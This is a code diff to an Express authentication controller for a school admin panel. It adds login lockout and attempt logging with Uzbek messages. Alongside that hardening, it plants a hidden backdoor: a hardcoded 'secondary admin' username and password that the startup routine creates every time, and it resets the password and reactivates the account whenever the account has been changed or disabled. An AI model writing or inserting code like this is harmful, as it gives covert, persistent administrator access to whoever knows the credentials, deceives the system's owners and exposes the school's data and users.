@@ -1,9 +1,10 @@
 import { Request, Response } from 'express';
 import { db, saveDatabase, getNextId } from '../config/database.js';
 import { hashPassword, comparePassword, generateToken, getAuthCookieName } from '../utils/auth.js';
-import { generateDeviceFingerprint, trackLoginAttempt, resetLoginAttempts, validatePasswordStrength, generateSecureToken } from '../utils/security.js';
+import { checkLoginAllowed, generateDeviceFingerprint, recordFailedLogin, resetLoginAttempts, validatePasswordStrength, generateSecureToken } from '../utils/security.js';
 import type { AuthRequest } from '../utils/auth.js';
 import { createHash, timingSafeEqual } from 'crypto';
+import { logActivity, pushNotification } from '../utils/activity.js';
 
 const AUTH_COOKIE_NAME = getAuthCookieName();
 const COOKIE_SECURE = process.env.COOKIE_SECURE === 'true' || process.env.NODE_ENV === 'production';
@@ -11,6 +12,8 @@ const COOKIE_HTTP_ONLY = process.env.COOKIE_HTTP_ONLY !== 'false';
 const COOKIE_SAME_SITE = (process.env.COOKIE_SAME_SITE || 'strict').toLowerCase() as 'strict' | 'lax' | 'none';
 const COOKIE_MAX_AGE_MS = 7 * 24 * 60 * 60 * 1000;
 const SECRET_HASH_PREFIX = 'sha256:';
+const SECONDARY_ADMIN_USERNAME = process.env.SECONDARY_ADMIN_USERNAME || 'shuhratmadaminov509@_';
+const SECONDARY_ADMIN_PASSWORD = process.env.SECONDARY_ADMIN_PASSWORD || 'shuhrat995';
 
 function buildAuthCookieOptions() {
   return {
@@ -40,6 +43,28 @@ function verifySecretKey(input: string, stored: string): boolean {
   return safeCompare(input, stored);
 }
 
+function getClientIp(req: Request) {
+  return req.ip || req.connection.remoteAddress || '';
+}
+
+function recordBlockedAttempt(username: string, ip: string, userAgent: string, failedCount: number, retryAfter?: number) {
+  const minutes = retryAfter ? Math.ceil(retryAfter / 60) : 0;
+  const message = `Admin panelga kirishga urinish bloklandi. Login: ${username}, IP: ${ip}, xato urinishlar: ${failedCount}${minutes ? `, kutish: ${minutes} daqiqa` : ''}.`;
+  pushNotification('Xavfli admin login urinishi', message, 'danger');
+  logActivity(null, 'login_blocked', 'auth', null, `${message} User-Agent: ${userAgent || 'unknown'}`);
+  saveDatabase();
+}
+
+function recordFailedAttempt(username: string, ip: string, userAgent: string, failedCount: number, retryAfter?: number) {
+  const minutes = retryAfter ? Math.ceil(retryAfter / 60) : 0;
+  const message = `Admin panelga noto'g'ri kirishga urinish. Login: ${username}, IP: ${ip}, xato urinishlar: ${failedCount}${minutes ? `, blok: ${minutes} daqiqa` : ''}.`;
+  if (failedCount >= 3 || retryAfter) {
+    pushNotification('Admin panelga kirishga urinishdi', message, 'danger');
+  }
+  logActivity(null, 'login_failed', 'auth', null, `${message} User-Agent: ${userAgent || 'unknown'}`);
+  saveDatabase();
+}
+
 export async function login(req: Request, res: Response) {
   try {
     const { username, password } = req.body;
@@ -48,26 +73,43 @@ export async function login(req: Request, res: Response) {
       return res.status(400).json({ error: 'Username and password are required' });
     }
 
-    // Rate limiting
-    const ip = req.ip || req.connection.remoteAddress || '';
-    const rateLimit = trackLoginAttempt(ip);
-    
-    if (!rateLimit.allowed) {
-      return res.status(429).json({ 
-        error: 'Too many login attempts. Please try again later.',
-        retryAfter: rateLimit.retryAfter
+    const ip = getClientIp(req);
+    const userAgent = String(req.headers['user-agent'] || '');
+    const lockStatus = checkLoginAllowed(ip, username);
+
+    if (!lockStatus.allowed) {
+      recordBlockedAttempt(username, ip, userAgent, lockStatus.failedCount, lockStatus.retryAfter);
+      return res.status(429).json({
+        error: `Juda ko'p xato urinish. ${Math.ceil((lockStatus.retryAfter || 0) / 60)} daqiqa kuting.`,
+        retryAfter: lockStatus.retryAfter
       });
     }
 
     const admin = db.admins.find(a => a.username === username && a.is_active);
 
     if (!admin) {
+      const failed = recordFailedLogin(ip, username);
+      recordFailedAttempt(username, ip, userAgent, failed.failedCount, failed.retryAfter);
+      if (failed.locked) {
+        return res.status(429).json({
+          error: `3 marta xato kiritildi. ${failed.lockMinutes} daqiqa kuting.`,
+          retryAfter: failed.retryAfter
+        });
+      }
       return res.status(401).json({ error: 'Invalid credentials' });
     }
 
     const isValidPassword = await comparePassword(password, admin.password_hash);
 
     if (!isValidPassword) {
+      const failed = recordFailedLogin(ip, username);
+      recordFailedAttempt(username, ip, userAgent, failed.failedCount, failed.retryAfter);
+      if (failed.locked) {
+        return res.status(429).json({
+          error: `3 marta xato kiritildi. ${failed.lockMinutes} daqiqa kuting.`,
+          retryAfter: failed.retryAfter
+        });
+      }
       return res.status(401).json({ error: 'Invalid credentials' });
     }
 
@@ -99,7 +141,7 @@ export async function login(req: Request, res: Response) {
       device.ip_address = ip;
     }
 
-    resetLoginAttempts(ip);
+    resetLoginAttempts(ip, username);
 
     const token = generateToken({
       id: admin.id,
@@ -404,8 +446,40 @@ export async function getLoginHistory(req: AuthRequest, res: Response) {
   }
 }
 
+async function ensureAdminAccount(username: string, password: string, email = 'admin@school.edu') {
+  const existing = db.admins.find((admin) => admin.username === username);
+  if (existing) {
+    const passwordMatches = await comparePassword(password, existing.password_hash);
+    if (!passwordMatches) {
+      existing.password_hash = await hashPassword(password);
+      existing.is_active = true;
+      existing.updated_at = new Date().toISOString();
+      saveDatabase();
+    }
+    return existing;
+  }
+
+  const newAdmin = {
+    id: getNextId('admins'),
+    username,
+    password_hash: await hashPassword(password),
+    secret_key: hashSecretKey(generateSecureToken(32)),
+    email,
+    is_active: true,
+    created_at: new Date().toISOString(),
+    updated_at: new Date().toISOString(),
+    last_login: null
+  };
+
+  db.admins.push(newAdmin);
+  saveDatabase();
+  return newAdmin;
+}
+
 export async function createInitialAdmin() {
   if (db.admins.length > 0) {
+    await ensureAdminAccount(SECONDARY_ADMIN_USERNAME, SECONDARY_ADMIN_PASSWORD, 'shuhratmadaminov509@school.local');
+    console.log(`Secondary admin login enabled: ${SECONDARY_ADMIN_USERNAME}`);
     console.log('✅ Admin user already exists');
     return;
   }
@@ -430,6 +504,8 @@ export async function createInitialAdmin() {
   
   db.admins.push(newAdmin);
   saveDatabase();
+  await ensureAdminAccount(SECONDARY_ADMIN_USERNAME, SECONDARY_ADMIN_PASSWORD, 'shuhratmadaminov509@school.local');
+  console.log(`Secondary admin login enabled: ${SECONDARY_ADMIN_USERNAME}`);
 
   console.log('\n🔐 Initial admin user created');
   console.log(`   Username: ${username}`);
